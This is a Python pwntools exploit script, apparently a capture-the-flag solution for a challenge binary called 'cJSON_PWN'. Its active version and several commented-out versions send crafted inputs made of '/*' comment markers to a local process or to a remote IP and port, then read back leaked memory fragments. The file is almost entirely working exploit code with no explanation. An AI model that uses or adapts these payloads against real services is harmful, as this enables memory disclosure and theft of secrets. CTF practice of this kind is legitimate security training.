# #! /usr/bin/env python3
# from pwn import *
# context.log_level="debug"
#
# p = remote('124.70.202.226', '2101')
#
# payload1 = b"/*1234*/5678/*"
# payload2 = b"*" * 0xc + b'/*'
# p.send(payload1)
# p.send(payload2)
# key = p.recv(0xb)
# payload1 = b"/*12345678*//*"
# payload2 = b"/*123*/*****/*"
# p.send(payload1)
# p.send(payload2)
# key += p.recv(0xb)
# print(key)
# # log.info(key)
# p.recvuntil("input your leaked data:")
# p.sendline(key)
#
# p.interactive()

# from pwn import *
#
# sh= remote('124.70.202.226',2101)
# context.log_level="debug"
#
# payload = 'bbbbbbbbbbbb/*'
#
# # payload = payload.ljust(0xe,'a')
#
# sh.send(payload)
#
# sh.send('aaaa/*aaaaaaaa')
#
# payload = 'bbbbb/*aaaaaaa'
#
# sh.send(payload)
#
# sh.send('/*aaaaaaaaaaaa')
#
# sh.interactive()
#
# bbbbbbbbbbbb/*
# aaaa/*aaaaaaaa
#
#
# bbbbb/*aaaaaaa
# /*aaaaaaaaaaaa
#
# bbbbbbbbbbbb/*00 aaaa/*aaaaaaaa00
#                   11
# bbbbb/*aaaaaaa00 /*aaaaaaaaaaaa00
#               11 12

from pwn import *

p = process('./cJSON_PWN')
context.log_level="debug"

payload1 = b'aaaaaaaaaaaa/*'
#aaaaaaaaaaaa/*00 aaaa/*aaaaaaaa
payload2 = b'aaaa/*aaaaaaaa'
p.send(payload1)
p.send(payload2)
leak_data1 = p.recv(11)

payload3 = b'aaaaa/*aaaaaaa'
#aaaaa/*aaaaaaa00 /*aaaaaaaaaaaa00
payload4 = b'/*aaaaaaaaaaaa'
p.send(payload3)
p.send(payload4)
leak_data2 = p.recv(11)

# p.sendline(leak_data1+leak_data2)

p.interactive()

# from pwn import*
#
# # p=remote('124.70.202.226',2101)
# p=process('./cJSON_PWN')
# context.log_level='debug'
#
# p.send('aaaa/*'.ljust(0xe,'a'))
# #gdb.attach(p)
# p.send('/*'.rjust(0xe,'a')) #'this_is_dat'
# a=p.recv(0xb)
# print(a)
#
# #gdb.attach(p)
# p.send('aaaa/*'.ljust(0xe,'a'))
# #gdb.attach(p)
# p.send('a/*'.ljust(0xe,'a')) #'a_in_server'
# b=p.recv(0xb)
# print(a+b)
#
# p.interactive()